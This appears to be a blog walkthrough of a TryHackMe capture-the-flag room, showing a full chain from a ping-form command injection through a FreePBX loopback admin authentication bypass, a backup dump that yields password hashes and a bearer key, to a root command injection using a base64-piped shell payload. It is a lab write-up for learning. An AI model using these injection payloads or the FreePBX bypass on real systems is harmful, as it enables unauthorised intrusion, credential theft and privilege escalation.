---
layout: post
title: "TryHackMe — Infinity Pool Walkthrough"
date: 2026-08-08
categories: [tryhackme, writeup, freepbx, command-injection]
tags: [thm, ctf, walkthrough, freepbx, asterisk, graphql, command-injection]
---

# TryHackMe — Infinity Pool Walkthrough

Hello guys and welcome back to another walkthrough. This time we'll be tackling Infinity Pool from TryHackMe, an intermediate room themed around a surveillance-luxe hotel called Byte Lotus with the tagline "Stay Noticed". The box starts off as a simple command injection on a hidden staff network check tool which drops us into the box as the web user. From there most of the interesting stuff is running on loopback. There's a telephony stack running FreePBX 16.0.45 with a voicemail that holds the key to the final service and a root-running automation service gated by a bearer token. The box was designed to be solved by logging into the FreePBX user portal with a real browser and reading the token from a voicemail widget's caller-id field. In this walkthrough we'll be skipping the browser entirely and using the much cooler unintended route, a FreePBX loopback admin authentication bypass that lets any module ajax command run as an admin without a session. Using the bypass we'll mint a GraphQL token with backup scope, create and download a full FreePBX backup which includes the voicemail file, grab the automation bearer key from it, feed it to the root-running automation service and finally pwn the box. Let's jump in.

I begun by running an nmap scan on the box using the command
```
nmap -Pn -sS --top-ports 1000 -sV 10.48.171.223
```
The results are as follows
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Gunicorn
```

Only two ports exposed which is pretty boring. A full port scan confirmed the same. Whatever else the box was running it was definitely behind loopback.

I started off by having a look at the web application
```
curl -s http://10.48.171.223/
<title>Byte Lotus &mdash; Stay Noticed</title>
... "A surveillance-luxe hotel experience ... Reserve a suite and let us
    anticipate your every need"
```

And the robots.txt had something interesting
```
User-agent: *
Disallow: /internal/
Disallow: /status
```

Robots.txt disallowing something is usually a good sign. I went ahead and had a look at the frontend javascript and found this juicy comment
```
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
```

So /status posts to /internal/netcheck and it's a staff network check tool. Navigating to /status gave us a form that posts a host field to /internal/netcheck
```
<form method="post" action="/internal/netcheck" class="tool">
  <input type="text" name="host" value="" placeholder="property host e.g. 10.0.0.5" autofocus>
  <button type="submit">Check</button>
</form>
```

A network check tool that takes a host means ping and a ping with unsanitized input means command injection. The backend was doing an unsanitized `subprocess.run(f"ping -c 1 {host}", shell=True)` hence our injection point. The command i used was
```
curl -s -X POST http://10.48.171.223/internal/netcheck \
    --data-urlencode 'host=127.0.0.1;id'
```
Output:
```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Command execution as web (uid=1001). Note that `;` is the reliable separator here, the `$()` and backtick flavors get expanded into the ping argument instead of being executed as new commands. Also make sure to use `--data-urlencode` so the shell metacharacters survive curl's form encoding.

Reading the user flag
```
curl -s -X POST http://10.48.171.223/internal/netcheck \
    --data-urlencode 'host=127.0.0.1;cat /home/web/user.txt'
```
User flag: `THM{n0_v1s1bl3_……………….._3dg3}`

With a shell on the box i enumerated the listening services and this is where the room gets interesting. The command i used was
```
ss -tlnp
```
Output:
```
LISTEN  0       2048   0.0.0.0:80            ...    gunicorn            # edge (public)
LISTEN  0       4096   0.0.0.0:22            ...                          # ssh
LISTEN  0       10     127.0.0.1:8089       ...                          # Asterisk HTTP
LISTEN  0       10     127.0.0.1:8088       ...                          # Asterisk ARI
LISTEN  0       511    127.0.0.1:8080       ...                          # FreePBX admin + UCP
LISTEN  0       80     127.0.0.1:3306       ...                          # MariaDB
LISTEN  0       10     127.0.0.1:5038       ...                          # Asterisk AMI
LISTEN  0       2048   127.0.0.1:3000       ...                          # watchtower
LISTEN  0       2048   127.0.0.1:9000       ...                          # automation (root)
```

A whole telephony stack on loopback. FreePBX admin on 8080, MariaDB on 3306, Asterisk services on 8088/8089/5038 and two custom python services, watchtower on 3000 and automation on 9000 running as root. Automation running as root is what got my attention. I started with watchtower's config endpoint which had no auth at all
```
curl -s http://127.0.0.1:3000/api/config
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Leaked FreePBX UCP credentials and the automation endpoint. The automation service exposes a health endpoint that documents itself pretty well
```
curl -s http://127.0.0.1:9000/health
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

So automation runs as root and /jobs/export is gated by a bearer key. We need that key. The key lives in automation.env which is mode 750 root:root and unreadable by us. I also tried the obvious candidate, the cloud-init token in /etc/thm/ai-token which is a 64 hex string
```
curl -s -X POST http://127.0.0.1:9000/jobs/export \
    -H 'Content-Type: application/json' \
    -H 'Authorization: Bearer 27119f99a3bad58dff3520c644b73e6171fd20549ed9db61d978ebe7a63431e3' \
    -d '{"report":"latest"}'
{"error":"missing or invalid bearer token"}
```

Not the key. So the key is not derivable from the obvious sources and the env file is root only. This is where the primary technique comes in.

Remember the FreePBX admin panel on 127.0.0.1:8080. FreePBX 16.0.45 runs Apache as the asterisk user. We have UCP credentials but a UCP session does not grant FreePBX admin and we don't know the admin password. Instead of attacking the login i attacked the authentication itself. Looking at /var/www/html/admin/libraries/BMO/Ajax.class.php we find this interesting bit
```php
function doRequest(...) {
    // If the request is from loopback, skip authentication entirely
    if (in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1','::1'])) {
        $bootstrap_settings['freepbx_auth'] = false;   // <-- bypass
    }
    ...
    // A command runs if the module's ajaxRequest() returns true
}
```

FreePBX's ajax handler trusts loopback by design and skips authentication whenever the request comes from 127.0.0.1. So any module ajax command whose ajaxRequest() returns true runs as admin without any session. We just need to send the request from the box itself with a Referer of http://127.0.0.1:8080/admin/ and X-Requested-With XMLHttpRequest. So what does this actually mean? It means from our web shell we can talk to the FreePBX admin ajax endpoint as if we were an authenticated admin. First thing i did was dump the users
```
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' \
    -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=userman&command=getUsers'
[{"id":"1","auth":"1","username":"FreePBXUCPTemplateCreator",
  "password":"$2y$08$zfE9VkUo4CukNC3HB3h1gO5yWvgAdY8QbQnoc21j2pvwYL2YuSLIu",
  "default_extension":"9919988","email":"admin@bytelotus.local",...}]
```

We can read the whole userman table including the bcrypt hash of the template creator user. getJSON with jdata=ampusers gave us the admin username which is not admin
```
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' \
    -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=core&command=getJSON&jdata=ampusers'
[{"username":"fpbxadmin"}]
```

But that only returns usernames no hashes. I needed a full dump of the FreePBX database and the backup module is the way to do it. The bypass also lets us mint OAuth2 tokens via the api module. With scopes=gql:backup we get a GraphQL token with backup scope
```
curl -s -X POST -H 'Referer: http://127.0.0.1:8080/admin/' \
    -H 'X-Requested-With: XMLHttpRequest' \
    --data 'scopes=gql:backup&host=http://127.0.0.1:8080' \
    'http://127.0.0.1:8080/admin/ajax.php?module=api&command=getAccessToken&route='
{"status":true,"token":"<GQL_TOKEN>"}
```

With the GQL token the backup module accepts mutations including creating backup jobs. First i checked the backup surface to confirm there are no pre-existing jobs and to get the local storage location
```
# no pre-existing backup jobs
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=backup&command=backupGrid'
[]

# local storage location
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=backup&command=backupStorage'
[{"label":"Local","children":[{"value":"Local_75f179dc-2b7f-45c9-8c5c-b8686fb1d17b"}]}]
```

Creating a backup job with all modules via a GraphQL mutation
```
POST /admin/ajax.php?module=api&command=gql&route=
Authorization: Bearer <GQL_TOKEN>

{"query":"mutation { addBackup(input: {
    name: \"sentinel\",
    backupModules: [\"all\"],
    storageLocation: [\"Local_75f179dc-2b7f-45c9-8c5c-b8686fb1d17b\"]
  }) { status message id } }"}

-> {"status":true,"message":"Backup has been performed/schedules",
    "id":"9e111d44-3110-470b-bb56-f6674defe50e"}
```

The backup job got created. Now run it. This executes fwconsole backup as asterisk producing a tarball in /var/spool/asterisk/backup/
```
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' \
    -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=backup&command=runBackup&id=9e111d44-3110-470b-bb56-f6674defe50e'
{"status":true,"message":"Backup running","transaction":"7ecdde0f-...","pid":"9611"}
```

To download the backup i registered the local files which fills a config with md5 to path mappings then downloaded the tarball using the md5 keyed id
```
# register local backup files
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=backup&command=localRestoreFiles'
/var/spool/asterisk/backup/20260808-072121-1786173681-16.0.45-1050586722.tar.gz

# download the tarball
curl -s -H 'Referer: http://127.0.0.1:8080/admin/' -H 'X-Requested-With: XMLHttpRequest' \
    'http://127.0.0.1:8080/admin/ajax.php?module=backup&command=localdownload&id=8bf622289e6ab7c298c1ba234486b4e3' \
    -o /tmp/freepbx_backup.tar.gz
```

Full FreePBX backup with 81 entries including a MariaDB dump, module json files and voicemail. Time to loot. The core module json has the admin password hash
```
tar xzf /tmp/freepbx_backup.tar.gz modulejson/Core.json -O | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["Ampusers"])'
[{"username":"fpbxadmin",
  "password_sha1":"e9696d1d667ed6cd4b8a51528acc62a804f9d9e1",
  "sections":"*"}]
```

The backup also includes the voicemail files and this is where the magic happened
```
tar xzf /tmp/freepbx_backup.tar.gz files/var/spool/asterisk/voicemail/default/9919988/INBOX/msg0000.txt -O
callerid="Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

The automation service was provisioned with a voicemail message whose caller-id is literally the automation bearer key. cc_auto_7b3f9a1c4e0d2f6a. Extension 9000 lines up perfectly with the automation service port. A caller id lookup process templated the automation key straight into the CID name field for calls involving extension 9000. A good lesson on why you shouldn't template secrets into display fields.

Feeding the key to automation /jobs/export. The report value is interpolated into a tar command which runs as root
```
tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1
```
I tested the injection with a python one liner. The command i used was
```python
import urllib.request, json

base = 'http://127.0.0.1:9000'
key  = 'cc_auto_7b3f9a1c4e0d2f6a'

req = urllib.request.Request(
    base + '/jobs/export',
    data=json.dumps({'report': 'x;id;echo'}).encode(),
    headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + key},
    method='POST',
)
r = urllib.request.urlopen(req, timeout=25)
print(r.status)
print(r.read().decode())
```
Output:
```
200
{"command":"tar czf /var/automation/exports/x;id;echo.tgz /var/automation/data 2>&1",
 "output":"uid=0(root) gid=0(root) groups=0(root)\n/bin/sh: 1: echo.tgz: not found\n..."}
```

uid=0(root). We're root. I read the root flag using base64 to keep the command clean
```python
import urllib.request, json, base64

base = 'http://127.0.0.1:9000'
key  = 'cc_auto_7b3f9a1c4e0d2f6a'
cmd  = 'cat /root/root.txt'
b64  = base64.b64encode(cmd.encode()).decode()

req = urllib.request.Request(
    base + '/jobs/export',
    data=json.dumps({'report': 'x;echo ' + b64 + '|base64 -d|sh;echo'}).encode(),
    headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + key},
    method='POST',
)
r = urllib.request.urlopen(req, timeout=25)
print(r.read().decode())
```
Output:
```
{"command":"tar czf /var/automation/exports/x;echo Y2F0IC9yb290L3Jvb3QudHh0|base64 -d|sh;echo.tgz /var/automation/data 2>&1",
 "output":"`THM{tr4c3d_……………….._h0r1z0n}`\n/bin/sh: 1: echo.tgz: not found\n..."}
```

And the box is pretty much done. The whole chain from a low privilege web shell to root: a command injection for the web shell, a FreePBX loopback admin authentication bypass to mint API tokens, the backup module as an arbitrary full database dump, the automation key hiding in a voicemail caller-id and a second command injection this time as root. Two command injections and a secrets management fail.

By the way, a note on the intended method. The box was actually designed to be solved by logging into the FreePBX UCP portal in a real browser with the leaked credentials FreePBXUCPTemplateCreator / St4yN0t1c3d_2026 and reading the same automation key from a voicemail widget's caller-id field. The UCP login flow is JS/AJAX driven and plain curl login posts never authenticate which is why it needs a browser. The reason i went with the backup route instead is that it's fully reproducible from the shell without ever touching the browser, no guessing and honestly way cooler. Both routes converge on the same voicemail message and the same root command injection on the automation service.

If you liked the walkthrough clap for me down below and follow me so that you don't miss any upcoming ones.
